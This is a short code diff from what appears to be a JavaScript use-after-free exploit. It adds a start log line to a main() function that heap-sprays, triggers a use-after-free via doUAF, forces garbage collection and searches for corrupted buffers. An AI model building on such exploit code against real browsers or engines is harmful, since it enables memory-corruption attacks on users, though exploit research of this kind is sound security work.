@@ -51,6 +51,8 @@ function findCorrupted(buffers) {
 }
 
 async function main() {
+    log(`[+] START`);
+
   const pre = spray(SPRAY_COUNT, UAF_SIZE);
   const leaked = await doUAF(1600);
   gc(); await sleep();
